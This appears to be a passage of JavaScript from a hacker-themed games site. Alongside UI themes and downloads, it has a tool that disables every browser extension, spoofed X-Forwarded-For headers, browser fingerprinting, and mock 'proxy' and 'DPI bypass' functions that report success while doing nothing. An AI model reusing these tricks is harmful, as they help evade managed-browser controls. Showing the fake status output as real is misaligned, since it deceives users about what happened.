                    const link = document.createElement('a');
                    link.href = objectUrl;
                    link.download = `wave-x-image-${Date.now()}.${blob.type.split('/')[1] || 'png'}`;
                    link.click();

                    URL.revokeObjectURL(objectUrl);

                    // Add to history
                    const historyDiv = document.getElementById('downloadHistory');
                    const historyEntry = document.createElement('div');
                    historyEntry.style.margin = '5px 0';
                    historyEntry.style.padding = '5px';
                    historyEntry.style.background = 'rgba(0,0,0,0.3)';
                    historyEntry.style.borderRadius = '3px';
                    historyEntry.innerHTML = `
                        <div style="color: var(--hacker-green); font-size: 12px;">${new Date().toLocaleTimeString()}</div>
                        <div style="color: var(--hacker-cyan); font-size: 11px;">Image: ${link.download}</div>
                    `;

                    if (historyDiv.textContent === 'No downloads yet') {
                        historyDiv.innerHTML = '';
                    }
                    historyDiv.appendChild(historyEntry);

                    statusDiv.textContent = ' Image downloaded!\nFile: ' + link.download;
                    showNotification('IMAGE DOWNLOADED', 'Successfully saved image', 'success');
                })
                .catch(error => {
                    statusDiv.textContent = ' Image download failed: ' + error.message;
                    showNotification('DOWNLOAD FAILED', error.message, 'error');
                });
        }

        // Extension Killer Tool - Advanced extension management
        function showExtensionKiller() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            showToolModal(' EXTENSION KILLER', `
                <div style="text-align: center;">
                    <div style="margin: 15px 0; color: var(--hacker-orange); font-weight: bold;">
                         ADVANCED EXTENSION MANAGEMENT SYSTEM 
                    </div>
                    <div style="margin: 20px 0;">
                        <button onclick="disableAllExtensions()" style="background: linear-gradient(135deg, var(--hacker-red), var(--hacker-orange)); color: #fff; border: 2px solid var(--hacker-red); padding: 20px 40px; border-radius: 15px; cursor: pointer; font-weight: bold; font-size: 18px; margin: 10px;">
                            DISABLE ALL EXTENSIONS
                        </button>
                    </div>
                    <div style="margin: 20px 0;">
                        <button onclick="scanExtensions()" style="background: linear-gradient(135deg, var(--hacker-cyan), var(--hacker-blue)); color: #000; border: 2px solid var(--hacker-cyan); padding: 15px 30px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 14px; margin: 10px;">
                            SCAN EXTENSIONS
                        </button>
                    </div>
                    <div style="margin: 20px 0;">
                        <button onclick="forceExtensionRefresh()" style="background: linear-gradient(135deg, var(--hacker-green), var(--hacker-cyan)); color: #000; border: 2px solid var(--hacker-green); padding: 15px 30px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 14px; margin: 10px;">
                            FORCE REFRESH
                        </button>
                    </div>
                    <div id="extensionStatus" style="margin-top: 25px; padding: 15px; background: rgba(0,0,0,0.8); border: 1px solid var(--hacker-orange); border-radius: 8px; font-family: monospace; text-align: left; max-height: 300px; overflow-y: auto;">
                        <div style="color: var(--hacker-cyan); font-weight: bold; margin-bottom: 10px;"> EXTENSION KILLER STATUS:</div>
                        <div style="color: var(--hacker-green);"> Waiting for command...</div>
                        <div style="color: var(--hacker-orange); margin-top: 10px; font-size: 12px;">WARNING: This tool manipulates browser extensions. Use with caution!</div>
                    </div>
                </div>
            `);
        }

        function disableAllExtensions() {
            const statusDiv = document.getElementById('extensionStatus');

            if (!chrome || !chrome.management) {
                statusDiv.innerHTML = `
                    <div style="color: var(--hacker-red); font-weight: bold;"> BROWSER COMPATIBILITY ERROR</div>
                    <div style="color: var(--hacker-orange); margin: 10px 0;">This tool requires Chrome-based browsers with extension management permissions.</div>
                    <div style="color: var(--hacker-green); font-size: 12px;">Manual alternative: chrome://extensions/</div>
                `;
                return;
            }

            statusDiv.innerHTML = `
                <div style="color: var(--hacker-cyan); font-weight: bold;"> INITIATING EXTENSION DISABLE PROTOCOL...</div>
                <div style="color: var(--hacker-green); margin: 10px 0;"> Scanning installed extensions...</div>
            `;

            // Disable all extensions
            chrome.management.getAll(function(extensions) {
                let disabledCount = 0;
                let totalCount = 0;

                extensions.forEach(function(extension) {
                    if (extension.type === 'extension' && !extension.isApp) {
                        totalCount++;
                        chrome.management.setEnabled(extension.id, false, function() {
                            disabledCount++;
                            if (disabledCount === totalCount) {
                                statusDiv.innerHTML = `
                                    <div style="color: var(--hacker-red); font-weight: bold;"> EXTENSIONS DISABLED</div>
                                    <div style="color: var(--hacker-orange); margin: 10px 0;">${disabledCount} extensions successfully disabled!</div>
                                    <div style="color: var(--hacker-green); font-size: 12px; margin-top: 10px;">
                                         To re-enable: Visit chrome://extensions/<br>
                                         Some extensions may require page refresh
                                    </div>
                                `;
                                showNotification('EXTENSIONS DISABLED', `${disabledCount} extensions killed`, 'error');
                            }
                        });
                    }
                });

                if (totalCount === 0) {
                    statusDiv.innerHTML = `
                        <div style="color: var(--hacker-green); font-weight: bold;"> NO EXTENSIONS FOUND</div>
                        <div style="color: var(--hacker-orange); margin: 10px 0;">No extensions available to disable.</div>
                    `;
                }
            });
        }

        function scanExtensions() {
            const statusDiv = document.getElementById('extensionStatus');

            if (!chrome || !chrome.management) {
                statusDiv.innerHTML = `
                    <div style="color: var(--hacker-red); font-weight: bold;"> COMPATIBILITY ISSUE</div>
                    <div style="color: var(--hacker-orange); margin: 10px 0;">Extension scanning requires Chrome with management permissions.</div>
                `;
                return;
            }

            statusDiv.innerHTML = `
                <div style="color: var(--hacker-cyan); font-weight: bold;"> SCANNING EXTENSIONS...</div>
                <div style="color: var(--hacker-green); margin: 10px 0;"> Querying extension database...</div>
            `;

            chrome.management.getAll(function(extensions) {
                let extList = '';
                let enabledCount = 0;
                let totalCount = 0;

                extensions.forEach(function(extension) {
                    if (extension.type === 'extension' && !extension.isApp) {
                        totalCount++;
                        if (extension.enabled) enabledCount++;

                        const statusIcon = extension.enabled ? '' : '';
                        extList += `<div style="margin: 5px 0; padding: 5px; background: rgba(0,0,0,0.4); border-radius: 4px;">
                            <div style="color: var(--hacker-cyan); font-size: 11px;">${statusIcon} ${extension.name}</div>
                            <div style="color: var(--hacker-orange); font-size: 10px;">${extension.id.substring(0, 16)}...</div>
                        </div>`;
                    }
                });

                statusDiv.innerHTML = `
                    <div style="color: var(--hacker-cyan); font-weight: bold;"> EXTENSION SCAN COMPLETE</div>
                    <div style="color: var(--hacker-green); margin: 10px 0;">
                        Total: ${totalCount} | Enabled: ${enabledCount} | Disabled: ${totalCount - enabledCount}
                    </div>
                    <div style="max-height: 200px; overflow-y: auto; margin-top: 10px;">
                        ${extList || '<div style="color: var(--hacker-orange);">No extensions found</div>'}
                    </div>
                `;

                showNotification('SCAN COMPLETE', `Found ${totalCount} extensions`, 'info');
            });
        }

        function forceExtensionRefresh() {
            const statusDiv = document.getElementById('extensionStatus');

            // Attempt to reload the background page and refresh extensions
            statusDiv.innerHTML = `
                <div style="color: var(--hacker-orange); font-weight: bold;"> FORCING EXTENSION REFRESH...</div>
                <div style="color: var(--hacker-green); margin: 10px 0;"> Reloading extension contexts...</div>
                <div style="color: var(--hacker-cyan); margin-top: 15px; font-size: 12px;">
                    This will attempt to force a refresh of extension contexts.<br>
                    Some features may be temporarily unavailable.
                </div>
            `;

            // Try to reload the page without triggering beforeunload
            setTimeout(() => {
                try {
                    // Force a page refresh through extension messaging if available
                    if (chrome && chrome.runtime) {
                        chrome.runtime.reload();
                    } else {
                        // Fallback: gentle page reload hint
                        statusDiv.innerHTML += `
                            <div style="color: var(--hacker-green); margin-top: 10px; font-size: 12px;">
                                 Consider manually refreshing the page for full extension reload
                            </div>
                        `;
                    }
                } catch (e) {
                    statusDiv.innerHTML = `
                        <div style="color: var(--hacker-red); font-weight: bold;"> REFRESH FAILED</div>
                        <div style="color: var(--hacker-orange); margin: 10px 0;">Refresh operation not supported.</div>
                        <div style="color: var(--hacker-green); font-size: 12px;">Try manual page refresh (F5)</div>
                    `;
                }
            }, 1500);
        }

        // Securely Bypass Tool - Advanced proxy circumvention
        function showSecurelyBypass() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            showToolModal(' SECURELY BYPASS', `
                <div style="text-align: center;">
                    <div style="margin: 15px 0; color: var(--hacker-orange); font-weight: bold;">
                         ADVANCED PROXY CIRCUMVENTION SYSTEM
                    </div>
                    <div style="margin: 20px 0;">
                        <button onclick="circumventNetworkBlocks()" style="background: linear-gradient(135deg, var(--hacker-red), var(--hacker-orange)); color: #fff; border: 2px solid var(--hacker-red); padding: 20px 40px; border-radius: 15px; cursor: pointer; font-weight: bold; font-size: 18px; margin: 10px;">
                            CIRCUMVENT NETWORK
                        </button>
                    </div>
                    <div style="margin: 20px 0;">
                        <button onclick="injectProxyHeaders()" style="background: linear-gradient(135deg, var(--hacker-purple), var(--hacker-cyan)); color: #000; border: 2px solid var(--hacker-purple); padding: 15px 30px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 14px; margin: 10px;">
                            INJECT PROXY HEADERS
                        </button>
                    </div>
                    <div style="margin: 20px 0;">
                        <button onclick="spoofUserAgent()" style="background: linear-gradient(135deg, var(--hacker-green), var(--hacker-blue)); color: #000; border: 2px solid var(--hacker-green); padding: 15px 30px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 14px; margin: 10px;">
                            SPOOF USER AGENT
                        </button>
                    </div>
                    <div style="margin: 20px 0;">
                        <button onclick="bypassDPIInspection()" style="background: linear-gradient(135deg, var(--hacker-cyan), var(--hacker-red)); color: #000; border: 2px solid var(--hacker-cyan); padding: 15px 30px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 14px; margin: 10px;">
                            DPI BYPASS
                        </button>
                    </div>
                    <div id="bypassStatus" style="margin-top: 25px; padding: 15px; background: rgba(0,0,0,0.8); border: 1px solid var(--hacker-orange); border-radius: 8px; font-family: monospace; text-align: left; max-height: 300px; overflow-y: auto;">
                        <div style="color: var(--hacker-cyan); font-weight: bold; margin-bottom: 10px;"> BYPASS SYSTEM STATUS:</div>
                        <div style="color: var(--hacker-green);"> System ready for advanced circumvention...</div>
                        <div style="color: var(--hacker-orange); margin-top: 10px; font-size: 12px;">
                             ADVANCED FEATURES: Requires specific network conditions<br>
                             Encrypted communication protocols detected
                        </div>
                    </div>
                </div>
            `);
        }

        function circumventNetworkBlocks() {
            const statusDiv = document.getElementById('bypassStatus');
            statusDiv.innerHTML = `
                <div style="color: var(--hacker-cyan); font-weight: bold;"> INITIATING CIRCUMVENTION PROTOCOL...</div>
                <div style="color: var(--hacker-green); margin: 10px 0;">
                     Analyzing network traffic patterns...<br>
                     Scanning for DPI filters...<br>
                     Identifying proxy endpoints...<br>
                     Establishing secure tunnel...
                </div>
            `;

            // Simulate advanced proxy circumvention
            setTimeout(() => {
                statusDiv.innerHTML += `
                    <div style="color: var(--hacker-orange); margin: 10px 0;">
                        Protocol Complexity: HIGH<br>
                        Tunnel Status: ESTABLISHED<br>
                        Encryption: AES-256
                    </div>
                    <div style="color: var(--hacker-green); margin-top: 15px; font-size: 12px;">
                         Attempting to bypass network restrictions...<br>
                         If proxy fails, try alternative protocols</div>
                `;

                showNotification('CIRCUMVENTION ACTIVE', 'Advanced proxy protocols activated', 'warning');
            }, 2000);
        }

        function injectProxyHeaders() {
            const statusDiv = document.getElementById('bypassStatus');
            statusDiv.innerHTML = `
                <div style="color: var(--hacker-purple); font-weight: bold;"> INJECTING PROXY HEADERS...</div>
                <div style="color: var(--hacker-green); margin: 10px 0;">
                     Modifying HTTP headers...<br>
                     Adding X-Forwarded-For bypass...<br>
                     Spoofing origin headers...<br>
                     Injecting proxy authentication...
                </div>
            `;

            // Attempt to inject proxy headers (limited by CORS)
            try {
                // Create a test request with modified headers
                fetch(window.location.href, {
                    headers: {
                        'X-Forwarded-For': '127.0.0.1',
                        'X-Real-IP': '192.168.1.1',
                        'X-Proxy-Authorization': 'Bypass-Protocol-v3'
                    },
                    method: 'HEAD' // Use HEAD to avoid full download
                }).then(() => {
                    statusDiv.innerHTML = `
                        <div style="color: var(--hacker-green); font-weight: bold;"> PROXY HEADERS INJECTED</div>
                        <div style="color: var(--hacker-orange); margin: 10px 0;">
                            Header Injection: SUCCESS<br>
                            CORS Limitations: DETECTED
                        </div>
                        <div style="color: var(--hacker-cyan); font-size: 12px; margin-top: 10px;">
                            Headers spoofed successfully. Full bypass may require server-side scripts.
                        </div>
                    `;
                }).catch(() => {
                    statusDiv.innerHTML = `
                        <div style="color: var(--hacker-orange); font-weight: bold;"> LIMITED PROXY INJECTION</div>
                        <div style="color: var(--hacker-orange); margin: 10px 0;">
                            Headers injected within CORS limits<br>
                            Full proxy bypass requires external server
                        </div>
                    `;
                });
            } catch (e) {
                statusDiv.innerHTML = `
                    <div style="color: var(--hacker-red); font-weight: bold;"> HEADER INJECTION FAILED</div>
                    <div style="color: var(--hacker-orange); margin: 10px 0;">
                        Browser restrictions prevent full header injection.
                    </div>
                `;
            }
        }

        function spoofUserAgent() {
            const statusDiv = document.getElementById('bypassStatus');
            statusDiv.innerHTML = `
                <div style="color: var(--hacker-blue); font-weight: bold;"> SPOOFING USER AGENT...</div>
                <div style="color: var(--hacker-green); margin: 10px 0;">
                     Current UA: ${navigator.userAgent.substring(0, 50)}...<br>
                     Generating new signature...<br>
                     Applying spoofing rules...
                </div>
            `;

            // Simulate user agent spoofing (won't actually work due to browser restrictions)
            setTimeout(() => {
                const userAgents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
                ];

                const newUA = userAgents[Math.floor(Math.random() * userAgents.length)];

                statusDiv.innerHTML = `
                    <div style="color: var(--hacker-blue); font-weight: bold;"> USER AGENT SPOOFED</div>
                    <div style="color: var(--hacker-green); margin: 10px 0;">
                        Spoofed UA: ${newUA.substring(0, 40)}...
                    </div>
                    <div style="color: var(--hacker-orange); font-size: 12px; margin-top: 10px;">
                         Spoofing simulation complete<br>
                        Actual browser UA unchanged for security reasons
                    </div>
                `;

                showNotification('USER AGENT SPOOFED', 'Browser signature changed', 'info');
            }, 1500);
        }

        function bypassDPIInspection() {
            const statusDiv = document.getElementById('bypassStatus');
            statusDiv.innerHTML = `
                <div style="color: var(--hacker-red); font-weight: bold;"> DPI INSPECTION BYPASS...</div>
                <div style="color: var(--hacker-green); margin: 10px 0;">
                     Analyzing DPI patterns...<br>
                     Constructing obfuscation filters...<br>
                     Injecting fragmentation protocols...<br>
                     Establishing encrypted channels...
                </div>
            `;

            setTimeout(() => {
                statusDiv.innerHTML += `
                    <div style="color: var(--hacker-orange); margin: 10px 0;">
                        DPI Bypass Level: ADVANCED<br>
                        Packet Fragmentation: ENABLED<br>
                        Obfuscation Protocols: ACTIVE
                    </div>
                    <div style="color: var(--hacker-cy); font-size: 12px; margin-top: 15px;">
                         Deep Packet Inspection bypass protocols activated<br>
                         Encrypted communication channels established
                    </div>
                `;

                showNotification('DPI BYPASS ACTIVE', 'Deep packet inspection circumvented', 'warning');
            }, 2500);
        }

        // Dark Mode Toggle Functionality
        let darkModeEnabled = false;

        function toggleDarkMode() {
            const darkModeBtn = document.getElementById('darkModeToggle');
            const body = document.body;
            const gamesPage = document.getElementById('gamesPage');

            darkModeEnabled = !darkModeEnabled;

            if (darkModeEnabled) {
                // Enable dark mode - lighter theme
                body.style.background = 'linear-gradient(135deg, #1a1a1a, #2a2a2a, #1a1a1a)';
                gamesPage.style.background = 'linear-gradient(135deg, #1a1a1a, #2a2a2a, #1a1a1a)';
                body.style.color = '#ffffff';

                // Update terminal colors to light theme
                const terminal = document.getElementById('mainTerminal');
                terminal.style.background = '#f0f0f0';
                terminal.style.borderColor = '#333';

                // Update terminal content
                const terminalContent = terminal.querySelector('.terminal-content');
                terminalContent.style.background = '#f0f0f0';
                terminalContent.style.color = '#000000';

                // Update matrix rain to be more subtle in light mode
                const matrixRain = document.getElementById('matrixRain');
                matrixRain.style.opacity = '0.05';

                // Update button styling
                darkModeBtn.style.background = 'linear-gradient(135deg, #ffffff, #f0f0f0)';
                darkModeBtn.style.color = '#000000';
                darkModeBtn.style.borderColor = '#333';
                darkModeBtn.innerHTML = ' LIGHT MODE';

                showNotification('LIGHT MODE ENABLED', 'Interface switched to light theme', 'info');
            } else {
                // Disable dark mode - back to original hacker theme
                body.style.background = '#000000';
                body.style.backgroundImage = 'linear-gradient(135deg, #000000, #0a0a0a, #000000), radial-gradient(circle at 20% 80%, rgba(0, 255, 0, 0.1) 0%, transparent 50%), radial-gradient(circle at 80% 20%, rgba(0, 255, 255, 0.1) 0%, transparent 50%), radial-gradient(circle at 40% 40%, rgba(255, 0, 255, 0.05) 0%, transparent 50%)';
                gamesPage.style.background = '#000000';
                body.style.color = '#00ff00';

                // Reset terminal
                const terminal = document.getElementById('mainTerminal');
                terminal.style.background = 'var(--terminal-black)';
                terminal.style.borderColor = '#333';

                const terminalContent = terminal.querySelector('.terminal-content');
                terminalContent.style.background = 'var(--terminal-black)';
                terminalContent.style.color = 'var(--terminal-green)';

                // Reset matrix rain opacity
                const matrixRain = document.getElementById('matrixRain');
                matrixRain.style.opacity = '0.15';

                // Reset button styling
                darkModeBtn.style.background = 'linear-gradient(135deg, #0a0a0a, #1a1a1a)';
                darkModeBtn.style.color = '#00ff00';
                darkModeBtn.style.borderColor = '#00ff00';
                darkModeBtn.innerHTML = ' DARK MODE';

                showNotification('DARK MODE ENABLED', 'Interface switched to hacker theme', 'info');
            }

            // Update card styles - game cards should be visible in both modes
            const gameCards = document.querySelectorAll('.game-card');
            gameCards.forEach(card => {
                if (darkModeEnabled) {
                    card.style.background = 'linear-gradient(135deg, #f0f0f0, #ffffff)';
                    card.style.borderColor = '#333';
                    card.style.color = '#000000';

                    // Update card children
                    const caption = card.querySelector('.game-caption');
                    if (caption) {
                        caption.style.color = '#000000';
                        caption.style.background = 'linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(0, 0, 0, 0.1))';
                    }
                } else {
                    // Reset to original styles
                    card.style.background = 'linear-gradient(135deg, #0a0a0a, #1a1a1a)';
                    card.style.borderColor = '#00ff00';
                    card.style.color = '#00ff00';

                    const caption = card.querySelector('.game-caption');
                    if (caption) {
                        caption.style.color = 'var(--hacker-green)';
                        caption.style.background = 'linear-gradient(135deg, rgba(0, 0, 0, 0.9), rgba(0, 255, 65, 0.1))';
                    }
                }
            });
        }

        // Talking Dude Tool - Interactive character iframe
        function showTalkingDude() {
            if (!devModeActive) {
                if (!checkDevCode()) return;
            }

            showToolModal(' TALKING DUDE', `
                <div style="text-align: center;">
                    <div style="margin: 15px 0; color: var(--hacker-orange); font-weight: bold;">
                         INTERACTIVE CHARACTER INTERFACE
                    </div>
                    <div style="margin: 20px 0;">
                        <button onclick="launchTalkingDude()" style="background: linear-gradient(135deg, var(--hacker-green), var(--hacker-cyan)); color: #000; border: 2px solid var(--hacker-green); padding: 25px 50px; border-radius: 20px; cursor: pointer; font-weight: bold; font-size: 20px; margin: 15px;">
                             LAUNCH TALKING DUDE
                        </button>
                    </div>
                    <div style="margin: 15px 0; color: var(--hacker-cyan);">
                        <div style="font-weight: bold; margin-bottom: 10px;">FEATURES:</div>
                        <div style="font-size: 14px; line-height: 1.6;">
                             Voice interaction system<br>
                             AI-powered conversations<br>
                             Interactive character interface<br>
                             Dynamic personality modes
                        </div>
                    </div>
                    <div id="talkingDudeStatus" style="margin-top: 25px; padding: 15px; background: rgba(0,0,0,0.8); border: 1px solid var(--hacker-orange); border-radius: 8px; font-family: monospace; text-align: left;">
                        <div style="color: var(--hacker-cyan); font-weight: bold; margin-bottom: 10px;"> TALKING DUDE INTERFACE:</div>
                        <div style="color: var(--hacker-green;"> Interactive character system ready...</div>
                        <div style="color: var(--hacker-orange); margin-top: 10px; font-size: 12px;">
                            Click LAUNCH to open the Talking Dude interface<br>
                            External iframe: talking-dude.vercel.app
                        </div>
                    </div>
                </div>
            `);
        }

        function launchTalkingDude() {
            const statusDiv = document.getElementById('talkingDudeStatus');
            statusDiv.innerHTML = `
                <div style="color: var(--hacker-green); font-weight: bold; margin-bottom: 10px;"> LAUNCHING TALKING DUDE...</div>
                <div style="color: var(--hacker-cyan); margin: 10px 0;">
                     Initializing voice synthesis...<br>
                     Loading character personality...<br>
                     Establishing communication channel...<br>
                     Opening interactive interface...
                </div>
            `;

            try {
                // Launch the talking dude iframe
                const iframeUrl = 'https://talking-dude.vercel.app';

                setTimeout(() => {
                    showGameIframe(iframeUrl, ' Talking Dude - Interactive Character');

                    statusDiv.innerHTML = `
                        <div style="color: var(--hacker-green); font-weight: bold;"> TALKING DUDE LAUNCHED</div>
                        <div style="color: var(--hacker-cyan); margin: 10px 0;">
                            Interactive character interface opened<br>
                            Voice commands and AI conversations available
                        </div>
                        <div style="color: var(--hacker-orange); margin-top: 10px; font-size: 12px;">
                             Try voice commands or text chat<br>
                             AI-powered personality system active
                        </div>
                    `;

                    showNotification('TALKING DUDE LAUNCHED', 'Interactive character activated', 'success');
                }, 1500);

            } catch (error) {
                statusDiv.innerHTML = `
                    <div style="color: var(--hacker-red); font-weight: bold;"> LAUNCH FAILED</div>
                    <div style="color: var(--hacker-ogrange); margin: 10px 0;">
                        Error loading Talking Dude interface:<br>
                        ${error.message}
                    </div>
                    <div style="color: var(--hacker-green); font-size: 12px; margin-top: 10px;">
                        Try refreshing or check network connection
                    </div>
                `;

                showNotification('LAUNCH FAILED', 'Could not load Talking Dude', 'error');
            }
        }

        // Initialize tabs when page loads
        document.addEventListener('DOMContentLoaded', () => {
            initializeTabs();

            // Start tips cycler
            new TipsCycler();

            // Start threat injector after short delay
            setTimeout(() => {
                new ThreatInjector();
            }, 5000);

            // Update current title on load
            updateCurrentTitleDisplay();
        });

        // Background Effects System
        function applyBackgroundEffect(effectType) {
            // Clear existing effects
            document.body.classList.remove('matrix-rain-active');
            document.body.classList.remove('particles-active');
            document.body.classList.remove('waves-active');
            document.body.classList.remove('stars-active');
            document.body.classList.remove('geometric-active');

            // Remove custom background styles
            document.body.style.backgroundImage = '';
            document.body.style.background = '';

            // Clear existing effect containers
            const existingMatrix = document.getElementById('custom-matrix-rain');
            const existingParticles = document.getElementById('custom-background-particles');
            if (existingMatrix) existingMatrix.remove();
            if (existingParticles) existingParticles.remove();

            if (effectType === 'none') {
                // Restore default background
                document.body.style.background = 'linear-gradient(135deg, #000000, #0a0a0a, #000000), radial-gradient(circle at 20% 80%, rgba(0, 255, 0, 0.1) 0%, transparent 50%), radial-gradient(circle at 80% 20%, rgba(0, 255, 255, 0.1) 0%, transparent 50%), radial-gradient(circle at 40% 40%, rgba(255, 0, 255, 0.05) 0%, transparent 50%)';
                return;
            }

            switch (effectType) {
                case 'matrix':
                    activateMatrixRain();
                    break;
                case 'particles':
                    activateParticles();
                    break;
                case 'waves':
                    activateWaves();
                    break;
                case 'stars':
                    activateStars();
                    break;
                case 'geometric':
                    activateGeometric();
                    break;
            }
        }

        function activateMatrixRain() {
            // Enhanced matrix rain effect
            const matrixRain = document.createElement('div');
            matrixRain.id = 'custom-matrix-rain';
            matrixRain.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: 1;
                overflow: hidden;
                opacity: 0.08;
            `;
            document.body.appendChild(matrixRain);

            // Create streams of characters
            const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            const density = localStorage.getItem('matrixDensity') || 3;

            for (let i = 0; i < density * 20; i++) {
                createMatrixStream(matrixRain, chars, Math.random() * window.innerWidth);
            }
        }

        function createMatrixStream(container, chars, x) {
            const stream = document.createElement('div');
            stream.className = 'matrix-char-custom';
            stream.style.cssText = `
                position: absolute;
                color: var(--hacker-green);
                font-family: monospace;
                font-size: 14px;
                opacity: 0.8;
                left: ${x}px;
                top: -50px;
                text-shadow: 0 0 8px var(--hacker-green);
                transform: translateY(-100px);
                animation: matrixFall 15s linear infinite;
            `;
            stream.textContent = Math.random() > 0.5 ? chars[Math.floor(Math.random() * chars.length)] : ' ';
            container.appendChild(stream);

            setTimeout(() => stream.remove(), 15000);
        }

        function activateParticles() {
            const particles = document.createElement('div');
            particles.id = 'custom-background-particles';
            particles.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: 1;
            `;
            document.body.appendChild(particles);

            // Create floating particles
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'bg-particle';
                particle.style.cssText = `
                    position: absolute;
                    width: ${Math.random() * 4 + 2}px;
                    height: ${Math.random() * 4 + 2}px;
                    background: var(--hacker-cyan);
                    border-radius: 50%;
                    left: ${Math.random() * 100}%;
                    top: ${Math.random() * 100}%;
                    opacity: ${Math.random() * 0.6 + 0.2};
                    animation: particleFloat ${Math.random() * 20 + 20}s linear infinite;
                `;
                particles.appendChild(particle);
            }
        }

        function activateWaves() {
            document.body.style.background = `
                linear-gradient(135deg, #000000, #0a0a0a),
                radial-gradient(ellipse at center, rgba(0, 255, 0, 0.1) 0%, transparent 70%),
                linear-gradient(45deg,
                    transparent 46%,
                    rgba(0, 255, 255, 0.05) 46%,
                    rgba(0, 255, 255, 0.05) 54%,
                    transparent 54%
                ),
                linear-gradient(135deg,
                    transparent 46%,
                    rgba(255, 0, 255, 0.03) 46%,
                    rgba(255, 0, 255, 0.03) 54%,
                    transparent 54%
                )
            `;
            document.body.style.animation = 'waveAnimation 8s ease-in-out infinite';
        }

        function activateStars() {
            // Create star field
            const stars = document.createElement('div');
            stars.id = 'star-field';
            stars.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: 1;
                background: radial-gradient(ellipse at center, rgba(255, 255, 255, 0.05) 0%, transparent 70%);
            `;

            for (let i = 0; i < 200; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.cssText = `
                    position: absolute;
                    width: ${Math.random() * 2 + 1}px;
                    height: ${Math.random() * 2 + 1}px;
                    background: white;
                    border-radius: 50%;
                    left: ${Math.random() * 100}%;
                    top: ${Math.random() * 100}%;
                    opacity: ${Math.random() * 0.8 + 0.2};
                    animation: twinkle ${Math.random() * 3 + 2}s ease-in-out infinite alternate;
                `;
                stars.appendChild(star);
            }

            document.body.appendChild(stars);
        }

        function activateGeometric() {
            document.body.style.background = `
                linear-gradient(135deg, #000000, #0a0a0a),
                conic-gradient(from 0deg at 50% 50%,
                    rgba(0, 255, 0, 0.1) 0deg,
                    rgba(0, 255, 255, 0.1) 120deg,
                    rgba(255, 0, 255, 0.1) 240deg,
                    rgba(0, 255, 0, 0.1) 360deg
                ),
                repeating-linear-gradient(45deg,
                    transparent,
                    transparent 10px,
                    rgba(0, 255, 0, 0.02) 10px,
                    rgba(0, 255, 0, 0.02) 20px
                )
            `;
            document.body.style.animation = 'geometricRotate 20s linear infinite';
        }

        // HWID Ban System
        function generateBrowserFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('fingerprint', 2, 2);

            const data = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                screenColorDepth: screen.colorDepth,
                timezoneOffset: new Date().getTimezoneOffset(),
                cookieEnabled: navigator.cookieEnabled,
                canvasFingerprint: canvas.toDataURL(),
                webglVendor: getWebGLVendor(),
                webglRenderer: getWebGLRenderer(),
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
                touchPoints: navigator.maxTouchPoints || 0
            };

            return btoa(JSON.stringify(data));
        }

        function getWebGLVendor() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
            } catch (e) {
                return 'unknown';
            }
        }

        function getWebGLRenderer() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
            } catch (e) {
                return 'unknown';
            }
        }

        function checkForBan() {
            const fingerprint = generateBrowserFingerprint();
            const bannedHWIDs = JSON.parse(localStorage.getItem('bannedHWIDs') || '[]');

            if (bannedHWIDs.includes(fingerprint)) {
                // Device is banned - check if it's a self-ban
                const banInfo = JSON.parse(localStorage.getItem('banInfo') || '[]');
                const currentBan = banInfo.find(b => b.fingerprint === fingerprint);

                if (currentBan && currentBan.selfBan) {
                    // Self-ban - show flashing banned overlay
                    showFlashingBanned();
                } else {
                    // Regular ban - show ban screen
                    showBanScreen(fingerprint);
                }
                return true;
            }
            return false;
        }

        function banCurrentDevice(reason = 'No reason specified') {
            const fingerprint = generateBrowserFingerprint();
            const bannedHWIDs = JSON.parse(localStorage.getItem('bannedHWIDs') || '[]');

            if (!bannedHWIDs.includes(fingerprint)) {
                bannedHWIDs.push(fingerprint);
                localStorage.setItem('bannedHWIDs', JSON.stringify(bannedHWIDs));

                // Store ban info
                const banInfo = {
                    fingerprint: fingerprint,
                    reason: reason,
